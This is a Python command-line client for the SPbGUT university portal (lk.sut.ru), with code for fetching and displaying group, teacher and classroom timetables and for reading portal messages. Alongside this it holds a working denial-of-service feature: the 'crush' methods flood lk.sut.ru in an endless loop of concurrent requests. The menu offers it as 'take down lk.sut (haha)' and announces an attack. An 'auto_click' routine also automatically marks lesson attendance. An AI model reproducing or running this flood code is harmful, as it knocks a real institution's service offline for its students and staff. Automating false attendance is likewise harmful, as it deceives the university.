import os, json, aiohttp, asyncio, threading, re, logging
from bs4 import BeautifulSoup
import parsers
from datetime import datetime, timedelta, time
from tqdm.asyncio import tqdm_asyncio
from time import sleep
import html

if os.name=='nt': import msvcrt
else: import sys, fcntl, termios

# sut.ru отвечает 403 на запросы без браузерного User-Agent,
# поэтому все сессии к сервисам СПбГУТ ходят с этими заголовками.
BROWSER_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
}

class BonchAPI:
    def __init__(self, first_day: str, limit: int = 6):
        self.first_day = datetime.strptime(first_day, '%Y-%m-%d')
        self.set_current_week()
        self.limit = limit
        self.days_of_week_str_to_int = {'Понедельник': 0, 'Вторник': 1, 'Среда': 2, 'Четверг': 3, 'Пятница': 4, 'Суббота': 5}
        self.days_of_week = ['Понедельник', 'Вторник', 'Среда', 'Четверг', 'Пятница', 'Суббота']

    async def login(self, email: str, password: str) -> bool:
        AUTH = f'https://lk.sut.ru/cabinet/lib/autentificationok.php?users={email}&parole={password}'
        CABINET = 'https://lk.sut.ru/cabinet/'
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(40), trust_env=True, headers=BROWSER_HEADERS, connector=aiohttp.TCPConnector(force_close=True)) as session:
                async with session.get(f'{CABINET}?login=no') as response:
                    response.raise_for_status()
                    self.cookies = response.cookies
                    async with session.post(AUTH) as response:
                        response.raise_for_status()
                        text = await response.text()
                        if text == '1':
                            async with session.get(f'{CABINET}?login=yes') as response:
                                response.raise_for_status()
                                return True
                        else:
                            return False
        except Exception as e:
            return False

    async def auto_click(self, email: str, password: str, timeout: int = 15):
        URL = 'https://lk.sut.ru/cabinet/project/cabinet/forms/raspisanie.php'
        ERR_MSG = 'У Вас нет прав доступа. Или необходимо перезагрузить приложение..'

        response = False
        while not response:
            response = await self.login(email, password)

        while True:
            try:
                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(40), trust_env=True, headers=BROWSER_HEADERS, connector=aiohttp.TCPConnector(force_close=True)) as session:
                    async with session.get(URL, cookies=self.cookies) as response:
                        response.raise_for_status()
                        text = await response.text()
                        if text == ERR_MSG:
                            response = False
                            while not response:
                                response = await self.login(email, password)
                            continue

                        soup = BeautifulSoup(text, 'html.parser')
                        week = soup.find('h3').text.split('№')[1].split()[0]
                        knop_ids = tuple(x['id'][4:] for x in soup.find_all('span') if x.get('id', '').startswith('knop'))

                        for lesson_id in knop_ids:
                            async with session.post(f'{URL}?open=1&rasp={lesson_id}&week={week}', cookies=self.cookies) as response:
                                pass
            except Exception as e:
                pass
            finally:
                sleep(timeout)

    def set_current_week(self):
        today = datetime.now()
        if today < self.first_day:
            self.cur_week = 0
        else:
            cur_day = self.first_day
            self.cur_week = 0
            while today > cur_day:
                self.cur_week += 1
                cur_day = cur_day + timedelta(days=7)
            cur_day = cur_day - timedelta(days=7)
            self.cur_week -= 1

    async def get_schet(self):
        # На новом cabinet.sut.ru параметр "schet" больше не используется.
        # Метод оставлен как no-op для обратной совместимости с вызывающим кодом.
        self.schet = None

    @staticmethod
    def _parse_id_name_pairs(text: str) -> dict:
        """Разбирает ответ cabinet.sut.ru вида 'id1,name1;id2,name2;...' в {id: name}."""
        return parsers.parse_id_name_pairs(text)

    async def get_groups(self):
        # cabinet.sut.ru отдаёт группы по факультетам через POST-эндпоинт:
        # сначала запрашиваем список факультетов, затем группы каждого факультета.
        URL = 'https://cabinet.sut.ru/raspisanie_all_new.php'

        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(20), trust_env=True, headers=BROWSER_HEADERS) as session:
            async with session.post(URL, data={'choice': '1', 'type_z': '1', 'kurs': ''}) as response:
                response.raise_for_status()
                faculties = self._parse_id_name_pairs(await response.text())

            groups = {}
            for faculty_id in faculties:
                async with session.post(URL, data={'choice': '1', 'type_z': '1', 'kurs': '', 'faculty': faculty_id}) as response:
                    response.raise_for_status()
                    groups.update(self._parse_id_name_pairs(await response.text()))

        self.groups_id = groups

    async def get_timetable(self, session: aiohttp.ClientSession, type_z: str, group_id: str) -> list:
        # cabinet.sut.ru при нагрузке иногда не отдаёт расписание — повторяем до 3 раз.
        result = 'Ошибка сервера'
        for attempt in range(3):
            result = await self._get_timetable_once(session, type_z, group_id)
            if result != 'Ошибка сервера':
                return result
            if attempt < 2:
                await asyncio.sleep(1.5 * (attempt + 1))
        return result

    async def _get_timetable_once(self, session: aiohttp.ClientSession, type_z: str, group_id: str) -> list:
        URL = 'https://cabinet.sut.ru/raspisanie_all_new'
        data = {'type_z': str(type_z), 'group': str(group_id), 'ok': 'Показать'}

        try:
            async with session.post(URL, data=data) as response:
                status = response.status
                text = await response.text()

                if status != 200:
                    return 'Ошибка сервера'

                group_name = self.groups_id.get(group_id, group_id)
                return parsers.parse_timetable_table(text, group_name, self.first_day)
        except Exception as e:
            logging.error("Ошибка при разборе расписания группы %s: %s", group_id, e, exc_info=True)
            return 'Ошибка сервера'

    async def all_groups_timetable(self) -> dict:
        start = datetime.now()
        
        await self.get_schet()
        await self.get_groups()
        
        timetable = {}
        group_items = list(self.groups_id.items())
        connector = aiohttp.TCPConnector(limit=self.limit)
        async with aiohttp.ClientSession(connector=connector, trust_env=True, headers=BROWSER_HEADERS) as session:
            tasks = [self.get_timetable(session, '1', group_id) for group_id, _ in group_items]
            results = await tqdm_asyncio.gather(*tasks, desc='Загрузка групп', unit=' Групп',
                bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} | {rate_fmt}{postfix}')
            timetable = {group_name: results[index] for index, (_, group_name) in enumerate(group_items) if not isinstance(results[index], str)}
        self.save_to_json(timetable)
        end = datetime.now()
        logging.info('Всего групп получено: %s', len(timetable))
        logging.info('Потрачено времени: %s секунд', (end - start).total_seconds())
        return timetable

    @staticmethod
    def parse_lesson_time(time_str) -> datetime:
        if not time_str: return time(0, 0)
        start_time_str = time_str.split('-')[0]
        try: return datetime.strptime(start_time_str, '%H:%M').time()
        except ValueError: return time(0, 0)

    @staticmethod
    def teacher_timetable(timetable: dict, teacher: str) -> list:
        teacher_lessons = []
        for _, lessons in timetable.items():
            for lesson in lessons:
                if lesson['ФИО преподавателя'] and teacher in lesson['ФИО преподавателя']:
                    teacher_lessons.append(lesson)

        return sorted(teacher_lessons, key=lambda x: (x['Номер недели'], x['Номер дня недели'], BonchAPI.parse_lesson_time(x['Время занятия'])))

    @staticmethod
    def classroom_timetable(timetable: dict, classroom: str) -> list:
        classroom_lessons = []
        for _, lessons in timetable.items():
            for lesson in lessons:
                if lesson['Номер кабинета'] and classroom in lesson['Номер кабинета']:
                    classroom_lessons.append(lesson)

        return sorted(classroom_lessons, key=lambda x: (x['Номер недели'], x['Номер дня недели'], BonchAPI.parse_lesson_time(x['Время занятия'])))

    @staticmethod
    def format_output(timetable: list, week_number: int = None) -> str:
        output = ''

        if not timetable:
            output += 'Нет занятий для отображения\n'
            return output

        lessons_by_week = {}
        if week_number is None:
            for lesson in timetable:
                week = lesson['Номер недели']
                if week not in lessons_by_week:
                    lessons_by_week[week] = []
                lessons_by_week[week].append(lesson)
        else:
            lessons_by_week[week_number] = [lesson for lesson in timetable if lesson['Номер недели'] == week_number]
            if not lessons_by_week[week_number]:
                output += f'Нет занятий для недели {week_number}\n'
                return output

        for week, week_lessons in lessons_by_week.items():
            output += f'Неделя №{week}\n\n'

            grouped_lessons = {}
            for lesson in week_lessons:
                key = (lesson['Число'], lesson['Номер занятия'], lesson['Предмет'], lesson['Номер кабинета'])
                if key not in grouped_lessons:
                    grouped_lessons[key] = {
                        'Число': lesson['Число'],
                        'День недели': lesson['День недели'],
                        'Время занятия': lesson['Время занятия'],
                        'Номер занятия': lesson['Номер занятия'],
                        'Предмет': lesson['Предмет'],
                        'Группы': {lesson['Группа']},
                        'Преподаватели': set(),
                        'Тип занятия': lesson.get('Тип занятия', ''),
                        'Номер кабинета': lesson['Номер кабинета'],
                    }

                    teacher_string = lesson.get('ФИО преподавателя', '')
                    if teacher_string:
                        teachers = [t.strip() for t in teacher_string.split(';')]
                        for teacher in teachers:
                            grouped_lessons[key]['Преподаватели'].add(teacher)
                    else:
                        grouped_lessons[key]['Преподаватели'] = set()

                else:
                    grouped_lessons[key]['Группы'].add(lesson['Группа'])

                    teacher_string = lesson.get('ФИО преподавателя', '')
                    if teacher_string:
                        teachers = [t.strip() for t in teacher_string.split(';')]
                        for teacher in teachers:
                            grouped_lessons[key]['Преподаватели'].add(teacher)

            lessons_list = list(grouped_lessons.values())
            lessons_list.sort(key=lambda x: (x['Число'], BonchAPI.parse_lesson_time(x['Время занятия'])))

            if lessons_list:
                prev_day = lessons_list[0]['Число']
                day_of_week = lessons_list[0]['День недели']
                output += f'{prev_day} | {day_of_week}\n\n'

                for lesson in lessons_list:
                    cur_day = lesson['Число']
                    if cur_day != prev_day:
                        day_of_week = lesson['День недели']
                        prev_day = cur_day
                        output += f'{prev_day} | {day_of_week}\n\n'

                    lesson_time = lesson['Время занятия']
                    lesson_number = lesson['Номер занятия']
                    subject = lesson['Предмет']
                    groups = ', '.join(sorted(lesson['Группы']))
                    lesson_type = lesson.get('Тип занятия', '')
                    teachers = '; '.join(sorted(lesson['Преподаватели']))
                    room = lesson['Номер кабинета']

                    output += f'{lesson_time}\n'
                    output += f'{lesson_number}. {subject} | {groups}\n'
                    if lesson_type: output += f'{lesson_type}\n'
                    if teachers: output += f'{teachers}\n'
                    if room: output += f'{room}\n'
                    output += '\n'
            else:
                output += "Нет занятий на этой неделе\n\n"

        output = output[:-1]
        return output

    @staticmethod
    def save_to_json(timetable: dict, filepath: str = 'timetable.json'):
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(timetable, f, indent=4, ensure_ascii=False)
            logging.info('Расписание сохранено в файл: %s', filepath)
        except Exception as e:
            logging.error('Ошибка при сохранении расписания в файл: %s', e, exc_info=True)

    @staticmethod
    def load_from_json(filepath: str = 'timetable.json') -> dict:
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                timetable = json.load(f)
            logging.info('Расписание загружено из файла: %s', filepath)
            return timetable
        except Exception as e:
            logging.error('Ошибка при загрузке расписания из файла: %s', e, exc_info=True)
            return None

    @staticmethod
    def cls():
        os.system('cls' if os.name=='nt' else 'clear')

    @staticmethod
    def wait_key() -> bytes:
        if os.name == 'nt':
            return msvcrt.getch()
        else:
            fd = sys.stdin.fileno()
            flags_save = fcntl.fcntl(fd, fcntl.F_GETFL)
            attrs_save = termios.tcgetattr(fd)
            attrs = list(attrs_save)
            attrs[0] &= ~(termios.IGNBRK | termios.BRKINT | termios.PARMRK
                        | termios.ISTRIP | termios.INLCR | termios.IGNCR
                        | termios.ICRNL | termios.IXON)
            attrs[1] &= ~termios.OPOST
            attrs[2] &= ~(termios.CSIZE | termios.PARENB)
            attrs[2] |= termios.CS8
            attrs[3] &= ~(termios.ECHONL | termios.ECHO | termios.ICANON
                        | termios.ISIG | termios.IEXTEN)
            termios.tcsetattr(fd, termios.TCSANOW, attrs)
            fcntl.fcntl(fd, fcntl.F_SETFL, flags_save & ~os.O_NONBLOCK)
            ret = []
            try:
                ret.append(sys.stdin.read(1))
                fcntl.fcntl(fd, fcntl.F_SETFL, flags_save | os.O_NONBLOCK)
                c = sys.stdin.read(1)
                while len(c) > 0:
                    ret.append(c)
                    c = sys.stdin.read(1)
            except KeyboardInterrupt:
                ret.append('\x03')
            finally:
                termios.tcsetattr(fd, termios.TCSAFLUSH, attrs_save)
                fcntl.fcntl(fd, fcntl.F_SETFL, flags_save)
            return bytes(''.join(ret), encoding='utf-8')

    def timetable_interface(self, timetable: dict):
        self.cls()
        inp = b'-'
        self.change_group_name(timetable, self.group_name)
        while inp != b'\x1b':
            print(f'Расписание группы: {self.group_name}\n')
            print(self.format_output(timetable[self.group_name], self.cur_week))
            print(f'Текущая неделя: {self.cur_week}')
            print('[>] - следующая неделя')
            print('[<] - предыдущая неделя')
            print('[Esc] - выйти')
            inp = self.wait_key()
            self.cls()
            if inp in [b'K', b'\x1b[D']: self.cur_week = self.cur_week - 1 if self.cur_week > 0 else self.cur_week
            elif inp in [b'M', b'\x1b[C']: self.cur_week = self.cur_week + 1 if self.cur_week < 50 else self.cur_week
        self.set_current_week()

    def teacher_timetable_interface(self, timetable: dict, teacher: str):
        self.cls()
        inp = b'-'
        while inp != b'\x1b':
            print(f'Расписание преподавателя: {teacher}\n')
            teacher_timetable = self.teacher_timetable(timetable, teacher)
            print(self.format_output(teacher_timetable, self.cur_week))
            print(f'Текущая неделя: {self.cur_week}')
            print('[>] - следующая неделя')
            print('[<] - предыдущая неделя')
            print('[Esc] - выйти')
            inp = self.wait_key()
            self.cls()
            if inp in [b'K', b'\x1b[D']: self.cur_week = self.cur_week - 1 if self.cur_week > 0 else self.cur_week
            elif inp in [b'M', b'\x1b[C']: self.cur_week = self.cur_week + 1 if self.cur_week < 50 else self.cur_week
        self.set_current_week()

    def classroom_timetable_interface(self, timetable: dict, classroom: str):
        self.cls()
        inp = b'-'
        while inp != b'\x1b':
            print(f'Расписание кабинета: {classroom}\n')
            classroom_timetable = self.classroom_timetable(timetable, classroom)
            print(self.format_output(classroom_timetable, self.cur_week))
            print(f'Текущая неделя: {self.cur_week}')
            print('[>] - следующая неделя')
            print('[<] - предыдущая неделя')
            print('[Esc] - выйти')
            inp = self.wait_key()
            self.cls()
            if inp in [b'K', b'\x1b[D']: self.cur_week = self.cur_week - 1 if self.cur_week > 0 else self.cur_week
            elif inp in [b'M', b'\x1b[C']: self.cur_week = self.cur_week + 1 if self.cur_week < 50 else self.cur_week
        self.set_current_week()

    async def messages_interface(self):
        """Интерфейс для просмотра сообщений"""
        if not hasattr(self, 'email') or not hasattr(self, 'password'):
            print('Для просмотра сообщений требуются login и password в конфигурации\n')
            input('Нажмите Enter для продолжения...')
            return
        
        # Авторизация
        response = False
        while not response:
            response = await self.login(self.email, self.password)
            if not response:
                print('Ошибка авторизации. Проверьте логин и пароль.\n')
                input('Нажмите Enter для продолжения...')
                return
        
        self.cls()
        messages = await self.get_messages()
        
        if not messages:
            print('Нет входящих сообщений\n')
            input('Нажмите Enter для продолжения...')
            return
        
        selected_index = 0
        inp = b'-'
        
        while inp != b'\x1b':
            self.cls()
            print('Входящие сообщения:\n')
            for i, msg in enumerate(messages):
                marker = '>>>' if i == selected_index else '   '
                unread_marker = ' [НЕПРОЧИТАНО]' if msg.get('is_unread', False) else ''
                files_marker = ' [ФАЙЛЫ]' if msg.get('has_files', False) else ''
                date = msg.get('date', '')[:10] if msg.get('date') else ''
                sender_short = msg.get('sender', '')[:30] if msg.get('sender') else ''
                if sender_short and '(' in sender_short:
                    sender_short = sender_short.split('(')[0].strip()
                
                title = msg.get('title', 'Без названия')[:50]
                if len(msg.get('title', '')) > 50:
                    title += '...'
                
                print(f'{marker} [{i+1}] {date} | {sender_short}')
                print(f'     {title}{unread_marker}{files_marker}')
                if i < len(messages) - 1:
                    print()
            
            print('\n[Enter] - открыть сообщение')
            print('[↑/↓ или k/j] - выбрать сообщение')
            print('[Esc] - выйти')
            
            inp = self.wait_key()
            
            if inp == b'\r' or inp == b'\n':  # Enter
                if 0 <= selected_index < len(messages):
                    message_id = messages[selected_index]['id']
                    self.cls()
                    print('Загрузка сообщения...\n')
                    message = await self.get_message(message_id)
                    
                    if message:
                        self.cls()
                        selected_msg = messages[selected_index]
                        print('=' * 80)
                        print(f'Название: {message.get("name", selected_msg.get("title", "Без названия"))}')
                        print('=' * 80)
                        print(f'Дата: {selected_msg.get("date", "Не указана")}')
                        print(f'Отправитель: {selected_msg.get("sender", "Неизвестно")}')
                        print('-' * 80)
                        annotation = message.get("annotation", "Нет текста")
                        # Удаляем HTML теги и декодируем сущности
                        if annotation:
                            annotation = html.unescape(annotation)
                            # Простое удаление HTML тегов
                            annotation = re.sub(r'<[^>]+>', '', annotation)
                        print(f'\n{annotation}\n')
                        print('-' * 80)
                        if selected_msg.get("files"):
                            print('Файлы:')
                            for file_info in selected_msg["files"]:
                                print(f'  - {file_info.get("name", "Файл")}')
                                if file_info.get("url"):
                                    print(f'    URL: {file_info["url"]}')
                        elif message.get("files"):
                            print(f'Файлы: {message.get("files")}')
                        print('-' * 80)
                        print(f'ID: {message.get("id", message_id)}')
                        print(f'Тип документа: {message.get("viddok", "Не указан")}')
                        print('=' * 80)
                    else:
                        print('Не удалось загрузить сообщение\n')
                    
                    input('\nНажмите Enter для продолжения...')
            
            elif (inp in [b'K', b'\x1b[D', b'\x1b[A']) or (inp == b'k'):  # Стрелка вверх или 'k'
                selected_index = max(0, selected_index - 1)
            elif (inp in [b'M', b'\x1b[C', b'\x1b[B']) or (inp == b'j'):  # Стрелка вниз или 'j'
                selected_index = min(len(messages) - 1, selected_index + 1)

    def change_group_name(self, timetable: dict, group_name: str):
        if group_name in timetable: self.group_name = group_name
        elif self.group_name not in timetable: self.group_name = next(iter(timetable.keys()))

    async def get_messages_page(self, page: int = 1) -> dict:
        """
        Загружает ОДНУ страницу входящих сообщений (~20 шт).
        Возвращает {'messages': [...], 'total_pages': int}.

        Постраничная загрузка нужна для ленивой подгрузки в боте: страница 1
        отдаётся сразу, остальные — по мере листания. Куки/сессия
        переиспользуются между вызовами.
        """
        BASE_URL = 'https://lk.sut.ru/cabinet/project/cabinet/forms/message.php'
        empty = {'messages': [], 'total_pages': 1}

        if not hasattr(self, 'cookies'):
            if not hasattr(self, 'email') or not hasattr(self, 'password'):
                logging.warning("Нет cookies и нет email/password — не могу получить сообщения")
                return empty
            response = False
            while not response:
                response = await self.login(self.email, self.password)

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': 'https://lk.sut.ru/cabinet/',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        page = max(1, page)
        page_url = f'{BASE_URL}?type=in' if page == 1 else f'{BASE_URL}?page={page}&type=in'

        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(40), trust_env=True, headers=BROWSER_HEADERS, connector=aiohttp.TCPConnector(force_close=True)) as session:
                # Прогрев сессии — только для первой страницы (необязательный шаг).
                if page == 1:
                    try:
                        async with session.get('https://lk.sut.ru/cabinet/', cookies=self.cookies, headers=headers) as cab_response:
                            cab_response.raise_for_status()
                    except Exception as e:
                        logging.debug("Инициализация кабинета пропущена: %s", e)

                async with session.get(page_url, cookies=self.cookies, headers=headers) as response:
                    response.raise_for_status()
                    text = await response.text()

            if 'ERRNO:' in text or 'Undefined index' in text:
                logging.warning("Ошибка PHP на странице %s сообщений", page)
                return empty

            messages = parsers.parse_message_rows(text)
            total_pages = parsers.parse_total_message_pages(text)
            logging.debug("Страница %s сообщений: %s шт (всего страниц: %s)", page, len(messages), total_pages)
            return {'messages': messages, 'total_pages': total_pages}
        except Exception as e:
            logging.error('Ошибка при получении страницы %s сообщений: %s', page, e, exc_info=True)
            return empty

    async def get_messages(self) -> list:
        """
        Загружает ВСЕ страницы входящих (для CLI-режима messages_interface).
        Бот использует постраничную get_messages_page для ленивой загрузки.
        """
        first = await self.get_messages_page(1)
        all_messages = list(first['messages'])
        for page in range(2, first['total_pages'] + 1):
            all_messages.extend((await self.get_messages_page(page))['messages'])
        logging.debug("Итого сообщений со всех страниц: %s", len(all_messages))
        return all_messages

    async def get_message(self, message_id: str) -> dict:
        """Получить конкретное сообщение по ID"""
        URL = 'https://lk.sut.ru/cabinet/project/cabinet/forms/sendto2.php'
        
        if not hasattr(self, 'cookies'):
            if not hasattr(self, 'email') or not hasattr(self, 'password'):
                return {}
            response = False
            while not response:
                response = await self.login(self.email, self.password)
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(40), trust_env=True, headers=BROWSER_HEADERS, connector=aiohttp.TCPConnector(force_close=True)) as session:
                data = {
                    'id': message_id,
                    'prosmotr': ''
                }
                async with session.post(URL, cookies=self.cookies, data=data) as response:
                    response.raise_for_status()
                    text = await response.text()
                    
                    # Парсим JSON ответ
                    try:
                        message_data = json.loads(text)
                        # Декодируем HTML сущности в текстовых полях
                        if 'annotation' in message_data:
                            message_data['annotation'] = html.unescape(message_data['annotation'])
                        if 'name' in message_data:
                            message_data['name'] = html.unescape(message_data['name'])
                        return message_data
                    except json.JSONDecodeError:
                        # Если это не JSON, пытаемся парсить HTML
                        soup = BeautifulSoup(text, 'html.parser')
                        message_data = {
                            'id': message_id,
                            'annotation': '',
                            'name': '',
                            'viddok': '',
                            'otvet': 0,
                            'idinfo': 0,
                            'files': '',
                            'sendto': message_id,
                            'otpr': 0,
                            'history': 0
                        }
                        
                        # Пытаемся извлечь данные из HTML
                        name_elem = soup.find('input', {'name': 'name'}) or soup.find('h2') or soup.find('h3')
                        if name_elem:
                            message_data['name'] = name_elem.get('value', '') or name_elem.text.strip()
                        
                        annotation_elem = soup.find('textarea', {'name': 'annotation'}) or soup.find('div', class_='annotation')
                        if annotation_elem:
                            message_data['annotation'] = annotation_elem.get('value', '') or annotation_elem.text.strip()
                        
                        return message_data
        except Exception as e:
            print(f'Ошибка при получении сообщения: {e}')
            return {}

    async def crush_request(self, session: aiohttp.ClientSession, type_z: str, group_id: str):
        URL = f'https://lk.sut.ru/cabinet/project/cabinet/forms/raspisanie_all.php?schet={self.schet}&type_z={type_z}&group={group_id}'
        try:
            async with session.get(URL, cookies=self.cookies) as response:
                return response.status
        except Exception as e:
            return 'Ошибка подключения'
    
    async def crush(self, limit: int = 100):
        response = False
        while not response:
            response = await self.login(self.email, self.password)

        await self.get_schet()
        await self.get_groups()

        group_items = list(self.groups_id.items())
        connector = aiohttp.TCPConnector(limit=limit)
        while True:
            try:
                async with aiohttp.ClientSession(connector=connector, trust_env=True, headers=BROWSER_HEADERS) as session:
                    tasks = [self.crush_request(session, '1', group_id) for group_id, _ in group_items]
                    await asyncio.gather(*tasks)
            except Exception as e:
                pass

    def crush_lk_interface(self, limit: int = 100):
        if hasattr(self, 'email') and hasattr(self, 'password'):
            thread = threading.Thread(
                target=lambda: asyncio.run(self.crush(limit)),
                daemon=True
            )
            thread.start()
            print('Атака на lk.sut запущена\n')
        else:
            print('Для атаки требуются login и password в конфигурации\n')

    @classmethod
    def read_options(cls, filename: str = 'options.txt') -> 'BonchAPI':
        options = {}
        
        with open(filename, 'r', encoding='utf-8') as file:
            for line in file:
                clean_line = line.split('#')[0].strip()
                if not clean_line or '=' not in clean_line: continue
                key, value = clean_line.split('=', 1)
                options[key.strip()] = value.strip()

        if 'first_day' not in options:
            raise ValueError('Не указан обязательный параметр first_day в файле конфигурации')

        instance = cls(
            first_day=options['first_day'],
            limit=int(options.get('limit', 80))
        )

        if 'login' in options and 'password' in options:
            instance.email = options['login']
            instance.password = options['password']

        if options.get('auto-visit', 'False').lower() == 'true':
            if 'login' in options and 'password' in options:
                thread = threading.Thread(
                    target=lambda: asyncio.run(instance.auto_click(options['login'], options['password'])),
                    daemon=True
                )
                thread.start()
            else:
                print('Для авто-посещения требуются login и password в конфигурации\n')

        if 'group_name' in options:
            instance.group_name = options['group_name']

        return instance

async def main():
    '''
        Укажите в файле options.txt:

        # Обязательные параметры
        first_day=2025-02-03   # Первый день семестра

        # Опциональные параметры
        group_name=ИКПИ-22     # Ваша группа
        limit=20               # Количество одновременных запросов
        auto-visit=True        # Вкл/Выкл автопосещение
        login=your_login       # Логин для автопосещения
        password=your_password # Пароль для автопосещения
    '''

    api = BonchAPI.read_options()

    while True:
        timetable = None
        while timetable is None:
            print('[1] - получить расписание из sut.ru')
            print('[2] - получить расписание из timetable.json')
            print('[Esc] - выйти')
            inp = BonchAPI.wait_key()
            BonchAPI.cls()
            if inp == b'1': timetable = await api.all_groups_timetable()
            elif inp == b'2': timetable = BonchAPI.load_from_json()
            elif inp == b'\x1b': exit(0)

        inp = b'-'
        api.change_group_name(timetable, api.group_name)
        while inp != b'\x1b':
            print(f'Текущая неделя: {api.cur_week}\n')
            print(f'[1] - получить расписание группы')
            print(f'[2] - получить расписание преподавателя')
            print(f'[3] - получить расписание кабинета')
            print(f'[4] - изменить группу (текущая: {api.group_name})')
            print(f'[5] - положить lk.sut (ахаха)')
            print(f'[6] - просмотр сообщений')
            print(f'[Esc] - выйти')
            inp = BonchAPI.wait_key()
            BonchAPI.cls()
            if inp == b'1':
                api.timetable_interface(timetable)
            elif inp == b'2':
                teacher = input('Фамилия (И.О.) преподавателя: ')
                api.teacher_timetable_interface(timetable, teacher)
            elif inp == b'3':
                classroom = input('Номер кабинета: ')
                api.classroom_timetable_interface(timetable, classroom)
            elif inp == b'4':
                group_name = input('Название группы: ')
                api.change_group_name(timetable, group_name)
                BonchAPI.cls()
            elif inp == b'5':
                api.crush_lk_interface()
            elif inp == b'6':
                await api.messages_interface()
                BonchAPI.cls()

if __name__ == '__main__':
    # При запуске как самостоятельный CLI настраиваем вывод логов в консоль.
    # При импорте из main.py конфигурацию логирования задаёт main.py.
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
    )
    asyncio.run(main())